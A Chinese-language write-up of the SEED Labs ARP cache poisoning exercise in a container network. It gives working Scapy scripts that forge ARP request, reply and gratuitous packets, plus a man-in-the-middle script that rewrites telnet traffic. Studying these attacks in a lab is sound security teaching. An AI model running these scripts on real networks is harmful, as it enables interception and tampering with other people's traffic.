---
title: ARP-Cache-Poisoning-Attack-Lab
categories:
  - SeedLabs/NetworkSecurity
tags:
  - ARP Cache Poisoning
  - NetworkSecurity
abbrlink: 7b0ec57d
date: 2024-03-24 00:00:52
---

## Overview

地址解析协议(ARP)是一种通信协议，用于发现给定 IP 地址的链路层地址，即 MAC 地址。ARP 协议没有任何的安全措施，ARP 缓存投毒攻击是针对 ARP 协议的常见攻击。使用这种攻击，攻击者可以欺骗受害者接受伪造的 IP-to-MAC 映射，使受害者的数据包被重定向到伪造的 MAC 地址的计算机上，从而导致中间人攻击。

本次实验包括以下主题：

1.  ARP 协议
2.  ARP 缓存投毒攻击
3.  中间人攻击
4.  Scapy 编程

首先，我们使用了请求、响应和免费 ARP 数据包进行 ARP 缓存投毒攻击。然后在攻击的基础上，实现了中间人攻击，所有的数据流经中间人，可以被中间人读取并修改。

##  Environment Setup using Container

我们使用容器来构建实验环境，其中 Host M 是攻击者，Host A 和 Host B 分别是两个受害者。因为 ARP 缓存投毒攻击只能在局域网中进行，因此，这三台机器必须位于同一个局域网 10.9.0.0/24 中。

![img](https://otrdsfoo1w.feishu.cn/space/api/box/stream/download/asynccode/?code=NzFjMTRhYzIxNmY5OTAwZDMyMTg5ZTUzOGQxOTNlZjVfVU5aVXplNEYwWUpXT2ZxSmRheVJXOHZLS2RIYlpNNE5fVG9rZW46UUZZRWJyTXkyb1R5RW94ZUt5dmN6ZHdsbmtmXzE3MTEyMDk3MDU6MTcxMTIxMzMwNV9WNA)

-   共享文件夹
-   特权模式：通过 `privileged: true` 来实现。特权模式能在运行时修改内核参数（使用 sysctl），例如开启 IP 转发。

数据包嗅探，我们可以运行 `tcpdump -i 接口名称 -n` 来嗅探特定接口上的数据包。由于 Docker 的隔离机制，容器只能嗅探到自己的数据包，除非使用了主机模式，而主机可以嗅探到所有的数据包。通常，在主机上，Docker 创建的网络接口名称以 br 开头，而在容器中通常以 eth 开头。

也可以通过 Wireshark 来嗅探数据包。

##  Task 1: ARP Cache Poisoning

**Task 1.A (using ARP request)，**在 Host M 上，构造一个发送给 B 的 ARP 请求包来将 A 的 IP 地址绑定到 M 的 MAC 地址，这样在 B 给 A 发送数据包时，实际上会被发送给 M。

我们使用的代码如下，注意，在链路层使用的 MAC 地址为全 1，表示广播；在 ARP 数据包中 MAC 地址为全 0，这是要求。sendp() 直接发送数据链路层包，send() 发送的是网络层数据包，会自动封装链路层报头。

```Python
from scapy.all import *

# 使用 Host A 的 IP 地址, 但是是 M 的 MAC 地址来给 B 发送 ARP request
E = Ether(src='02:42:0a:09:00:69', dst='ff:ff:ff:ff:ff:ff')
A = ARP(psrc='10.9.0.5', hwsrc='02:42:0a:09:00:69',
        pdst='10.9.0.6', hwdst='00:00:00:00:00:00', op=1)

sendp(E/A)
```

首先，我们将 Host B 的缓存全部清空。可以使用 arp -n 查看缓存，使用 arp -d ip-address 删除缓存。然后，我们在 Host M 上执行如上的攻击代码，并查看 Host B 的 ARP 缓存，结果如下。接下来，Host B 去 ping Host A，再去查看 arp 缓存表，结果如下：

![img](https://otrdsfoo1w.feishu.cn/space/api/box/stream/download/asynccode/?code=Yzc4NzA0Y2M2YWMzZmM2NDIwMWUwNGQ5NGVjNzRiMzZfQXI5MThNZWc2QWtzY2NnemZkcXVVQ2hqSmF5dUVhd0NfVG9rZW46RmE2N2JzTXVrb3EzMEZ4VmhRNWN1SjZ4bnhmXzE3MTEyMDk3MDU6MTcxMTIxMzMwNV9WNA)

观察抓包到的结果如下：

![img](https://otrdsfoo1w.feishu.cn/space/api/box/stream/download/asynccode/?code=YjdhYWY2NThjOTFlZmE4ODRhNjgwMmY5NjJjODM5NzdfT3RPbEU2UU15TWs5dEhrbHJFenAzTEg1VDBsS3BQZU9fVG9rZW46R3M1ZWJmbEVwb0dHb2h4T3YzV2NEU2cxbnloXzE3MTEyMDk3MDU6MTcxMTIxMzMwNV9WNA)

第一第二个数据包就是我们的 ARP 欺骗。然后第三个数据包说是发送给 10.9.0.5，但是因为 ARP 的缓存是假的，实际上发送给了 Host M，我们通过第三个数据包的目的 MAC 地址就可以看出，ARP 欺骗成功了。

而后续其他的数据包是因为开启了 IP 转发，M 发现接收到的数据包不是自己的，就会去找到正确的那个数据包！下面的实验会涉及到，暂时不管它就好了。

**Task 1.B (using ARP reply)，**在 Host M 上，构造一个发送给 B 的 ARP 响应包来将 A 的 IP 地址绑定到 M 的 MAC 地址上。ARP 响应包使用的是单播，我们需要提前知道 B 的 MAC 地址。如下 op=2 表示是 ARP reply 包。

```Python
from scapy.all import *

# 使用 Host A 的 IP 地址, 但是是 M 的 MAC 地址来给 B 发送 ARP reply
E = Ether(src='02:42:0a:09:00:69', dst='02:42:0a:09:00:06')
A = ARP(psrc='10.9.0.5', hwsrc='02:42:0a:09:00:69',
        pdst='10.9.0.6', hwdst='02:42:0a:09:00:06', op=2)

sendp(E/A)
```

![img](https://otrdsfoo1w.feishu.cn/space/api/box/stream/download/asynccode/?code=YjljMjhiYmU2ZjY3M2U4ZTU3YmViYzViN2UzY2I3ZTFfb1BRRzFETmZwUHV3aENCcDhDZ0NSejc0SjJOTzFFNFNfVG9rZW46UFk5QWJXUGtnbzl4NHN4eVZhS2NRR1Z6blNlXzE3MTEyMDk3MDU6MTcxMTIxMzMwNV9WNA)

我们发现在 B 中有 A 的 ARP 缓存时，接收到构造的 ARP reply 包后，缓存更新了。

而下图，我们在删除了 ARP 缓存后，执行上述代码，发现 B 中没有创建新的 ARP 缓存记录。

![img](https://otrdsfoo1w.feishu.cn/space/api/box/stream/download/asynccode/?code=MWZlMTgwYTRiNmVkYjAzYzlkNTkzMmJiMjNkYTMzZjhfZWh1VmFOMmF6NHRQTHo0S3VITTd5ckx0UDIwRWRWRUtfVG9rZW46S0tvZ2JKb2dQb3Q4YTN4M3EwemNrR0w5bmZYXzE3MTEyMDk3MDU6MTcxMTIxMzMwNV9WNA)

ARP reply 包可以更新 ARP 缓存，但是不能创建新的 ARP 缓存记录。

**Task 1.C (using ARP gratuitous message)。**免费 ARP 包，简单来说，就是主动发出响应包，用于通知网络中其他设备有关发送者的信息，也即广播自己的 IP-to-MAC。免费 ARP 包具有如下特定：

-   源 IP 和目的 IP 地址是一样的，因为广播不需要目的 IP 地址。
-   目的 MAC 地址是全 1。
-   没有 reply 包。

```Python
from scapy.all import *

# 使用 Host A 的 IP 地址, 但是是 M 的 MAC 地址来广播 ARP gratuitous
E = Ether(src='02:42:0a:09:00:69', dst='ff:ff:ff:ff:ff:ff')
A = ARP(psrc='10.9.0.5', hwsrc='02:42:0a:09:00:69',
        pdst='10.9.0.5', hwdst='ff:ff:ff:ff:ff:ff', op=2)

sendp(E/A)
```

![img](https://otrdsfoo1w.feishu.cn/space/api/box/stream/download/asynccode/?code=NzljYjFjODc5YTE1NWRiZTAzZDBhODBhNmE3MWFkNjBfZEx6SnQ0enozVHZLalF6NDBYVnQ4SEwyZHV4RVN1aENfVG9rZW46R0NLYmJmcWNNb0p6eWJ4bHkyUGNiRWNMbkNoXzE3MTEyMDk3MDU6MTcxMTIxMzMwNV9WNA)

ARP gratuitous 包同样可以更新 ARP 缓存，但是不能创建新的 ARP 缓存记录。

##  Task 2: MITM Attack on Telnet using ARP Cache Poisoning

下面就是本任务实验的拓扑图。

![img](https://otrdsfoo1w.feishu.cn/space/api/box/stream/download/asynccode/?code=NDNiMDhlZTEwOTEwYjZjZmViYWY4ZGQ1YjVhYmNhMDlfOTJKME5xcTJ5Vng4UngwV2RMblJ0RUlLaE4xR2swUFdfVG9rZW46SXBQUGJyR1ZLbzRSVHV4QVVUSmNMQUJ5bmlkXzE3MTEyMDk3MDU6MTcxMTIxMzMwNV9WNA)

**Step 1 (Launch the ARP cache poisoning attack)。**首先，M 要欺骗 A，让其误以为 M 是 B；然后，M 要欺骗 B，让其误以为 M 是 A。

```Python
from scapy.all import *

# 欺骗 B, 让其以为 M 是 A
E = Ether(src='02:42:0a:09:00:69', dst='ff:ff:ff:ff:ff:ff')
A = ARP(psrc='10.9.0.5', hwsrc='02:42:0a:09:00:69',
        pdst='10.9.0.6', hwdst='00:00:00:00:00:00', op=1)
pkt1 = E/A

# 欺骗 A, 让其以为 M 是 B
E = Ether(src='02:42:0a:09:00:69', dst='ff:ff:ff:ff:ff:ff')
A = ARP(psrc='10.9.0.6', hwsrc='02:42:0a:09:00:69',
        pdst='10.9.0.5', hwdst='00:00:00:00:00:00', op=1)
pkt2 = E/A

while True:
    sendp(pkt1)
    sendp(pkt2)
    time.sleep(5)
```

**Step 2 (Testing)**。关闭 M 的 IP 转发，然后 A 和 B 互相 ping，发现 ping 不通。

![img](https://otrdsfoo1w.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTQzMDIxZGRjNTBjNTQ0YTRlNTMzYTI4M2UyYmRkYzFfTjQ3ZlNIcXBLdGdkNVVFSXFuYmZBMkNsb2hLeFFkTlhfVG9rZW46SmpuQ2JuOU5pb1dTVGp4cmNEV2NIRHRPbnBnXzE3MTEyMDk3MDU6MTcxMTIxMzMwNV9WNA)

其中 `-c 1` 表示发送一个 ping 数据包，如果一直 ping，前面 ping 不通一会之后就会 ping 通。

![img](https://otrdsfoo1w.feishu.cn/space/api/box/stream/download/asynccode/?code=ZWFlM2Q5YjdhYzlhNTQyZGI5Y2E3MmQ3MDgzNmE0N2RfcmdIRWhnS1l6aXNJOXRqZldaWlYxZlVmUnhiaGUzWllfVG9rZW46S0JyOWI0N21Wb2ZxZWh4SEhTUmNSRmhFbjBlXzE3MTEyMDk3MDU6MTcxMTIxMzMwNV9WNA)

**Step 3 (Turn on IP forwarding)**。开启 IP 转发后，发现可以 ping 通。

![img](https://otrdsfoo1w.feishu.cn/space/api/box/stream/download/asynccode/?code=Y2I3ZjNkY2Y4NWIzMWZmODdmZDBhYzlhMWIzNjBkNDBfMVg0ODRBb25hMm5ubTVRaFBFNTNWb1N5RXpLQnplQmdfVG9rZW46QTB0VGJndFowb1E1OHV4R3FYOWN1cWtFbmhjXzE3MTEyMDk3MDU6MTcxMTIxMzMwNV9WNA)

**Step 4 (Launch the MITM attack)**。首先，在开启 IP 转发或者关闭中间人攻击的条件下，建立 telnet 连接。发现输入数据如 sss 可以正确回显。然后我们开启中间人攻击并关闭 IP 转发，发现数据无法回显，这是因为数据被 M 接收了，没有响应。

![img](https://otrdsfoo1w.feishu.cn/space/api/box/stream/download/asynccode/?code=NDkxOGI4NjE3NTk5ZmRkNDkxZWY4NjdlNjczYjE2NDBfTFVwdlN0bEdpQzVndHYxdzdKUWhvanVwZkZicGttcHhfVG9rZW46S0tQMGIwNmZJbzdEMTZ4Y2tnS2NWcldQbk9iXzE3MTEyMDk3MDU6MTcxMTIxMzMwNV9WNA)

在 M 上运行如下嗅探并欺骗代码，将捕获的数据包的数据修改为 Z。

```Python
from scapy.all import *
import re

IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"
IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"

def spoof_pkt(pkt):
    # A 发送给 B 的数据
    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
        # Create a new packet based on the captured one.
        # 1) We need to delete the checksum in the IP & TCP headers,
        # because our modification will make them invalid.
        # Scapy will recalculate them if these fields are missing.
        # 2) We also delete the original TCP payload.
        newpkt = IP(bytes(pkt[IP]))
        del (newpkt.chksum)
        del (newpkt[TCP].payload)
        del (newpkt[TCP].chksum)

        # Construct the new payload based on the old payload.
        # Students need to implement this part.
        if pkt[TCP].payload:
            data = pkt[TCP].payload.load
            data = data.decode()
            newdata = re.sub(r'[a-zA-Z]', r'Z', data)
            newdata = newdata.encode()
            send(newpkt/newdata, verbose=False)
        else:
            send(newpkt, verbose=False)

    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
        # Create new packet based on the captured one
        # Do not make any change
        newpkt = IP(bytes(pkt[IP]))
        del (newpkt.chksum)
        del (newpkt[TCP].chksum)
        send(newpkt, verbose=False)

f = 'tcp and (ether src 02:42:0a:09:00:05 or ether src 02:42:0a:09:00:06)'
pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)
```

结果如下，输入任何字母，全部变成了 Z。

![img](https://otrdsfoo1w.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjcwMzhmODlmMjExMGJlMDA1MGZlMzg1MWMxMDY0ZjNfdGNxVFJ2TE1KSmtQUzJSdVVlR1lneUJ5YVlJRHpSRURfVG9rZW46UEU1RGJ2N0dkbzJPR1B4M1NNYWM2Q3dhbk9nXzE3MTEyMDk3MDU6MTcxMTIxMzMwNV9WNA)

要关闭转发程序并且设置 sysctl net.ipv4.ip_forward=1，才可以通过 exit 命令退出 telnet。否则，输入的 exit 全部变成 ZZZZ 或者不回显。

在 Telnet 窗口输入的任何字符，都会触发一个 TCP 数据包。也就是说，输入一个字符，就会发送一个 TCP 包给 Telnet 服务器，其中只包含一个字符，除非你输入的特别快。发送一个字符给服务器后，服务器会回复一个相同的字符给客户端，并显示在屏幕上。

因此，如果连接断开，输入的字符无法经过一个来回，就不会有任何显示；如果在来回的任何一个地方，数据被修改了，那么显示的就是修改后的数据！

##  Task 3: MITM Attack on Netcat using ARP Cache Poisoning

基本和上面一样，只不过上面是一个字符，这里一次发送的是一个字符串，如果替换后长度不变，那么和上面一模一样，但是如果改变了长度，就需要多做一些工作了，具体而言就是 IP 头部的总长度也需要改变。